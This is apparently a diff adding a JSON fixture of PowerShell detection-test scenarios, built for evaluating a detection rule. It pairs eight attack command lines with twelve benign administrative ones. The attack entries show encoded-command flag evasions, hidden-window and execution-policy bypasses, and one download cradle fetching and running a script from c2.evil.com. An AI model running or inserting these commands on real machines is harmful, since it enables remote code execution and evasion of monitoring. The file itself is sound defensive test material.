@@ -1,0 +1,288 @@
+[
+  {
+    "scenario_id": "ATK-001",
+    "name": "Standard PowerShell Encoded Command",
+    "description": "PowerShell process launched with standard -EncodedCommand flag.",
+    "expected_behavior": "Executes base64 encoded PowerShell script block.",
+    "mitre_technique_id": "T1059.001",
+    "mitre_tactic": "Execution",
+    "process_fields": {
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
+    },
+    "expected_detection_original": true,
+    "category": "attack"
+  },
+  {
+    "scenario_id": "ATK-002",
+    "name": "PowerShell Abbreviated Encoded Flag (-enc)",
+    "description": "PowerShell execution utilizing PowerShell's parameter abbreviation (-enc).",
+    "expected_behavior": "Executes base64 encoded payload bypassing exact string match for EncodedCommand.",
+    "mitre_technique_id": "T1059.001",
+    "mitre_tactic": "Execution",
+    "process_fields": {
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
+    },
+    "expected_detection_original": false,
+    "category": "attack"
+  },
+  {
+    "scenario_id": "ATK-003",
+    "name": "PowerShell Minimal Abbreviated Flag (-e)",
+    "description": "PowerShell execution using single letter parameter abbreviation (-e).",
+    "expected_behavior": "Executes base64 payload via minimal flag.",
+    "mitre_technique_id": "T1059.001",
+    "mitre_tactic": "Execution",
+    "process_fields": {
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -nop -w hidden -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
+    },
+    "expected_detection_original": false,
+    "category": "attack"
+  },
+  {
+    "scenario_id": "ATK-004",
+    "name": "PowerShell Core (pwsh.exe) Execution",
+    "description": "Modern cross-platform PowerShell Core binary used for encoded command execution.",
+    "expected_behavior": "Malicious payload executed inside pwsh.exe instead of powershell.exe.",
+    "mitre_technique_id": "T1059.001",
+    "mitre_tactic": "Execution",
+    "process_fields": {
+      "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+      "CommandLine": "pwsh.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
+    },
+    "expected_detection_original": false,
+    "category": "attack"
+  },
+  {
+    "scenario_id": "ATK-005",
+    "name": "Suspicious Parent Process Invocation",
+    "description": "PowerShell spawned by cmd.exe with hidden window and bypass policy.",
+    "expected_behavior": "Secondary payload launcher spawned from legacy command prompt.",
+    "mitre_technique_id": "T1059.001",
+    "mitre_tactic": "Defense Evasion",
+    "process_fields": {
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command Write-Host 'Beaconing'",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+    },
+    "expected_detection_original": false,
+    "category": "attack"
+  },
+  {
+    "scenario_id": "ATK-006",
+    "name": "PowerShell Download Cradle (IEX / WebClient)",
+    "description": "In-memory download cradle invoking remote malicious script.",
+    "expected_behavior": "Downloads and executes remote stage payload without EncodedCommand.",
+    "mitre_technique_id": "T1059.001",
+    "mitre_tactic": "Execution",
+    "process_fields": {
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://c2.evil.com/payload.ps1')\""
+    },
+    "expected_detection_original": false,
+    "category": "attack"
+  },
+  {
+    "scenario_id": "ATK-007",
+    "name": "Windows Slash Notation Flag (/enc)",
+    "description": "PowerShell CLI accepting Windows slash-style command arguments.",
+    "expected_behavior": "Slash parameter delimiter used instead of hyphen.",
+    "mitre_technique_id": "T1059.001",
+    "mitre_tactic": "Defense Evasion",
+    "process_fields": {
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe /enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
+    },
+    "expected_detection_original": false,
+    "category": "attack"
+  },
+  {
+    "scenario_id": "ATK-008",
+    "name": "Unrestricted Execution Policy Script Launch",
+    "description": "PowerShell executing unauthorized script with execution policy bypass.",
+    "expected_behavior": "Executes unapproved script directly from disk.",
+    "mitre_technique_id": "T1059.001",
+    "mitre_tactic": "Execution",
+    "process_fields": {
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -ep bypass -File C:\\Users\\Public\\loader.ps1"
+    },
+    "expected_detection_original": false,
+    "category": "attack"
+  },
+  {
+    "scenario_id": "BEN-001",
+    "name": "Standard Administrative Diagnostics",
+    "description": "Routine IT administrator system check.",
+    "expected_behavior": "Queries system parameters using Get-ComputerInfo.",
+    "mitre_technique_id": "",
+    "mitre_tactic": "Benign Administration",
+    "process_fields": {
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -Command Get-ComputerInfo"
+    },
+    "expected_detection_original": false,
+    "category": "benign"
+  },
+  {
+    "scenario_id": "BEN-002",
+    "name": "Scheduled System Maintenance Backup",
+    "description": "Windows Task Scheduler automated maintenance job.",
+    "expected_behavior": "Runs signed corporate backup script.",
+    "mitre_technique_id": "",
+    "mitre_tactic": "Benign Administration",
+    "process_fields": {
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -NoProfile -NonInteractive -File C:\\ProgramData\\EnterpriseBackup\\backup.ps1",
+      "ParentImage": "C:\\Windows\\System32\\taskhostw.exe"
+    },
+    "expected_detection_original": false,
+    "category": "benign"
+  },
+  {
+    "scenario_id": "BEN-003",
+    "name": "Enterprise Software Installer Wrapper",
+    "description": "Software installer invoking configuration script.",
+    "expected_behavior": "MsiExec helper executing deployment logic.",
+    "mitre_technique_id": "",
+    "mitre_tactic": "Benign Administration",
+    "process_fields": {
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -ExecutionPolicy Restricted -File C:\\Windows\\Installer\\install_agent.ps1",
+      "ParentImage": "C:\\Windows\\System32\\msiexec.exe"
+    },
+    "expected_detection_original": false,
+    "category": "benign"
+  },
+  {
+    "scenario_id": "BEN-004",
+    "name": "Active Directory User Query",
+    "description": "Admin retrieving user account directory properties.",
+    "expected_behavior": "Runs Get-ADUser cmdlet.",
+    "mitre_technique_id": "",
+    "mitre_tactic": "Benign Administration",
+    "process_fields": {
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -Command \"Get-ADUser -Filter * -Properties DisplayName\""
+    },
+    "expected_detection_original": false,
+    "category": "benign"
+  },
+  {
+    "scenario_id": "BEN-005",
+    "name": "VS Code Integrated Terminal Launch",
+    "description": "Developer launching developer shell in VS Code.",
+    "expected_behavior": "Normal developer interactive CLI session.",
+    "mitre_technique_id": "",
+    "mitre_tactic": "Benign Development",
+    "process_fields": {
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -NoExit",
+      "ParentImage": "C:\\Users\\Developer\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"
+    },
+    "expected_detection_original": false,
+    "category": "benign"
+  },
+  {
+    "scenario_id": "BEN-006",
+    "name": "Network Connection Diagnostic",
+    "description": "Admin testing reachability of domain controller.",
+    "expected_behavior": "Runs Test-NetConnection diagnostic.",
+    "mitre_technique_id": "",
+    "mitre_tactic": "Benign Administration",
+    "process_fields": {
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -Command Test-NetConnection -ComputerName dc01.internal -Port 389"
+    },
+    "expected_detection_original": false,
+    "category": "benign"
+  },
+  {
+    "scenario_id": "BEN-007",
+    "name": "Windows Defender Health Status Check",
+    "description": "SOC analyst checking endpoint antivirus status.",
+    "expected_behavior": "Queries antivirus signatures via Get-MpComputerStatus.",
+    "mitre_technique_id": "",
+    "mitre_tactic": "Benign Security",
+    "process_fields": {
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -Command Get-MpComputerStatus"
+    },
+    "expected_detection_original": false,
+    "category": "benign"
+  },
+  {
+    "scenario_id": "BEN-008",
+    "name": "Disk Space Maintenance Cleanup",
+    "description": "Automated storage cleanup routine.",
+    "expected_behavior": "Cleans temporary files.",
+    "mitre_technique_id": "",
+    "mitre_tactic": "Benign Maintenance",
+    "process_fields": {
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -File C:\\Windows\\System32\\cleanmgr.ps1"
+    },
+    "expected_detection_original": false,
+    "category": "benign"
+  },
+  {
+    "scenario_id": "BEN-009",
+    "name": "PowerShell Cmdlet Help Documentation",
+    "description": "User viewing cmdlet documentation in console.",
+    "expected_behavior": "Executes Get-Help cmdlet.",
+    "mitre_technique_id": "",
+    "mitre_tactic": "Benign Administration",
+    "process_fields": {
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -Command Get-Help Get-Service -Detailed"
+    },
+    "expected_detection_original": false,
+    "category": "benign"
+  },
+  {
+    "scenario_id": "BEN-010",
+    "name": "Microsoft SCCM Client Task Invocation",
+    "description": "Systems management client applying patch configuration.",
+    "expected_behavior": "Executes configuration compliance script.",
+    "mitre_technique_id": "",
+    "mitre_tactic": "Benign Administration",
+    "process_fields": {
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\CCM\\SystemHealthAgent.ps1",
+      "ParentImage": "C:\\Windows\\CCM\\CcmExec.exe"
+    },
+    "expected_detection_original": false,
+    "category": "benign"
+  },
+  {
+    "scenario_id": "BEN-011",
+    "name": "Azure PowerShell Management Module",
+    "description": "Cloud administrator connecting to Azure tenant.",
+    "expected_behavior": "Runs Connect-AzAccount module command.",
+    "mitre_technique_id": "",
+    "mitre_tactic": "Benign Administration",
+    "process_fields": {
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -Command Import-Module Az.Accounts; Connect-AzAccount -Identity"
+    },
+    "expected_detection_original": false,
+    "category": "benign"
+  },
+  {
+    "scenario_id": "BEN-012",
+    "name": "Windows Terminal Default Shell Startup",
+    "description": "Interactive terminal window opened by user.",
+    "expected_behavior": "WindowsTerminal.exe spawns interactive powershell shell.",
+    "mitre_technique_id": "",
+    "mitre_tactic": "Benign Interactive",
+    "process_fields": {
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe",
+      "ParentImage": "C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_1.18\\WindowsTerminal.exe"
+    },
+    "expected_detection_original": false,
+    "category": "benign"
+  }
+]
